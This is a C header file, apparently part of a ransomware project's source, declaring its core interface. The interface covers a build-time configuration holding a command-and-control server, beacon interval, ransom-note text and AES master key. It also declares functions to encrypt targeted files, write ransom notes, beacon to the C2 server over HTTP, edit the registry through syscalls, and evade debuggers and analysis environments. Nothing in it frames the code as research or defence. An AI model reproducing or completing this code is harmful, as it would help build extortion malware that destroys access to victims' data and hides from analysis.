#ifndef RANSOM_CORE_H
#define RANSOM_CORE_H

#include "file_ops.h"
#include "crypto_engine.h"
#include <stdint.h>

// Configuration structure (injected at build time)
typedef struct {
    char c2_server[256];
    char agent_id[64];
    char machine_id[64];
    uint32_t beacon_interval;
    char notification_type[16];  // "popup" or "permanent"
    char notification_message[512];
    char notification_title[64];
    uint8_t master_key[AES_KEY_SIZE];
    uint8_t master_iv[AES_IV_SIZE];
} ransom_config_t;

// File information structure
typedef struct {
    char *path;
    uint64_t size;
    uint32_t attributes;
    uint64_t creation_time;
    uint64_t last_access_time;
    uint64_t last_write_time;
} file_info_t;

// Target file extensions (same as PowerShell template)
extern const wchar_t* TARGET_EXTENSIONS[];
extern const uint32_t TARGET_EXTENSION_COUNT;

// Ransomware execution results
typedef struct {
    uint32_t files_encrypted;
    uint32_t directories_processed;
    uint32_t errors_encountered;
    uint64_t total_bytes_encrypted;
    char machine_id[64];
    uint64_t execution_timestamp;
} ransom_results_t;

// Core ransomware functions
int ransom_init(const ransom_config_t* config);
int ransom_execute(ransom_results_t* results);
int ransom_cleanup(void);

// Individual components
int ransom_generate_keys(void);
int ransom_send_beacon(const char* event_type);
int ransom_encrypt_files(ransom_results_t* results);
int ransom_write_notes(const wchar_t* directory);
int ransom_register_file_association(void);
int ransom_show_completion_dialog(const ransom_results_t* results);

// File filtering and processing
uint8_t is_target_file(const wchar_t* path);
uint8_t should_skip_file(const file_info_t* file_info);

// Registry operations via syscalls
int registry_create_key(const wchar_t* key_path);
int registry_set_value(const wchar_t* key_path, const wchar_t* value_name, const wchar_t* value_data);

// Network operations for C2 communication
int http_post_json(const char* url, const char* json_data, char* response, size_t response_size);

// Anti-analysis features
void anti_debug_checks(void);
void environment_checks(void);

// Error handling
const char* ransom_get_error_string(int error_code);

#endif // RANSOM_CORE_H
